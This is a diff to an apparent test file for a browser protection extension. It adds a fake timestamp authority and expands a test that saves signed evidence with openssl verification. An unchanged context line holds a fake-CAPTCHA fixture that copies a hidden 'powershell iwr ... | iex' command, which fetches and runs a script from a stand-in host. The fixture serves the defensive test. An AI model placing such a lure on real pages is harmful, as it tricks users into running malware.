@@ -4,7 +4,26 @@
 // modes and the activity log.
 import { after, before, test } from 'node:test';
 import assert from 'node:assert/strict';
+import { execFileSync } from 'node:child_process';
+import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { launch, startServer, visit } from './harness.js';
+
+// A stand-in timestamp authority: openssl answers with the test TSA's key.
+const TSA = fileURLToPath(new URL('../fixtures/tsa/', import.meta.url));
+const tsaDir = mkdtempSync(join(tmpdir(), 'scout-tsa-'));
+writeFileSync(join(tsaDir, 'serial'), '01\n');
+writeFileSync(
+  join(tsaDir, 'tsa.cnf'),
+  `[ tsa ]\ndefault_tsa = t\n[ t ]\nserial = ${tsaDir}/serial\nsigner_cert = ${TSA}tsa.crt\ncerts = ${TSA}ca.crt\nsigner_key = ${TSA}tsa.key\nsigner_digest = sha256\ndefault_policy = 1.2.3.4.1\ndigests = sha256\naccuracy = secs:1\ness_cert_id_alg = sha256\n`,
+);
+function fakeTsa(req, body, raw) {
+  writeFileSync(join(tsaDir, 'q.der'), raw);
+  execFileSync('openssl', ['ts', '-reply', '-config', join(tsaDir, 'tsa.cnf'), '-queryfile', join(tsaDir, 'q.der'), '-out', join(tsaDir, 'r.tsr')], { stdio: 'ignore' });
+  return { headers: { 'content-type': 'application/timestamp-reply' }, body: readFileSync(join(tsaDir, 'r.tsr')) };
+}
 
 let server, browser, port;
 const url = (host, path) => `http://${host}:${port}${path}`;
@@ -21,6 +40,7 @@ const stateOf = async (host) => {
 
 before(async () => {
   server = await startServer({
+    '/tsr': fakeTsa,
     '/captcha': `<!doctype html><title>Verify</title><p>Verify you are human. Press Win + R, then Ctrl + V.</p>
       <textarea id="t" style="position:absolute;left:-999px">powershell -w hidden -c "iwr http://x.example/a.ps1 | iex"</textarea>
       <button id="go" onclick="t.select(); document.execCommand('copy')">I'm not a robot</button>`,
@@ -144,16 +164,11 @@ test('a document that is really a program is paused before it finishes', async (
 });
 
 test('x-ray outlines blocked ad spots; first-visit note shows; request log names companies', async () => {
-  const t0 = Date.now();
   const page = await visit(browser.context, url('www.daily-news.example', '/news'), 2000);
   assert.ok(await until(async () => (await layer(page, '.toast')) === 1), 'first-visit note');
   const logged = (test) => until(async () => ((await stateOf('www.daily-news.example'))?.requests ?? []).some(test));
   assert.ok(await logged((r) => r.list === 'ads' && /doubleclick/.test(r.host)), 'the ad request is logged');
-  // The tracker is logged with its owner, unless Chrome reported the request
-  // with no tab (it occasionally does for test pages), in which case its own
-  // record must still show the block.
-  const chromeSawIt = async () => (await browser.probe.evaluate((t) => chrome.declarativeNetRequest.getMatchedRules({ minTimeStamp: t }), t0)).rulesMatchedInfo.some((m) => m.rule.rulesetId === 'easyprivacy');
-  assert.ok((await logged((r) => r.list === 'trackers' && r.company)) || (await chromeSawIt()), 'the tracker request is blocked and logged');
+  assert.ok(await logged((r) => r.list === 'trackers' && r.company), 'the tracker request is logged with its owner');
   const tabId = Number(Object.entries(await browser.ext.session()).find(([, v]) => v?.host === 'www.daily-news.example')[0].slice(4));
   await browser.ext.send({ type: 'xray', tabId, on: true });
   assert.ok(await until(async () => (await layer(page, '.box')) >= 2), 'ad frame and ad slot outlined');
@@ -172,16 +187,27 @@ test('x-ray outlines blocked ad spots; first-visit note shows; request log names
   assert.ok(!rules.some((r) => r.id === 19_990 || r.id === 19_991));
 });
 
-test('evidence: page, screenshot and a signed record land in Downloads', async () => {
+test('evidence: page, screenshot, a web archive, a signed record and a timestamp anyone can check land in Downloads', async () => {
+  await browser.probe.evaluate((u) => chrome.storage.local.set({ tsaUrl: u }), url('tsa.example', '/tsr'));
   const page = await visit(browser.context, url('evidence.example', '/landing'), 800);
   await page.bringToFront();
   const tabId = Number(Object.entries(await browser.ext.session()).find(([, v]) => v?.host === 'evidence.example')[0].slice(4));
   const res = await browser.ext.send({ type: 'saveEvidence', tabId });
   assert.ok(res.ok, res.error);
-  await page.waitForTimeout(1500);
+  assert.equal(res.value.timestamp.service, 'Test TSA', JSON.stringify(res.value.timestamp));
+  const done = async () => (await browser.probe.evaluate(() => chrome.downloads.search({ filenameRegex: 'Scout evidence', state: 'complete' }))).length === 6;
+  for (let i = 0; i < 30 && !(await done()); i++) await page.waitForTimeout(200);
   const files = await browser.probe.evaluate(() => chrome.downloads.search({ filenameRegex: 'Scout evidence' }));
-  assert.deepEqual(files.map((f) => f.filename.split(/[\\/]/).pop()).sort(), ['evidence.json', 'page.html', 'screenshot.png']);
-  assert.match(res.value.hashes['page.html'], /^[0-9a-f]{64}$/);
+  const byName = Object.fromEntries(files.map((f) => [f.filename.split(/[\\/]/).pop(), f.filename]));
+  assert.deepEqual(Object.keys(byName).sort(), ['HOW-TO-VERIFY.txt', 'evidence.json', 'evidence.tsr', 'page.html', 'page.wacz', 'screenshot.png']);
+  assert.match(res.value.hashes['page.wacz'], /^[0-9a-f]{64}$/);
+  // The timestamp checks out against the saved record with openssl alone.
+  assert.ok(existsSync(byName['evidence.tsr']), byName['evidence.tsr']);
+  const out = execFileSync('openssl', ['ts', '-verify', '-data', byName['evidence.json'], '-in', byName['evidence.tsr'], '-CAfile', `${TSA}ca.crt`, '-untrusted', `${TSA}tsa.crt`], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
+  assert.match(out, /Verification: OK/);
+  const record = JSON.parse(readFileSync(byName['evidence.json'], 'utf8'));
+  assert.equal(record.files['page.wacz'], res.value.hashes['page.wacz']);
+  await browser.probe.evaluate(() => chrome.storage.local.remove('tsaUrl'));
 });
 
 test('quiet mode keeps protection and drops the marks', async () => {
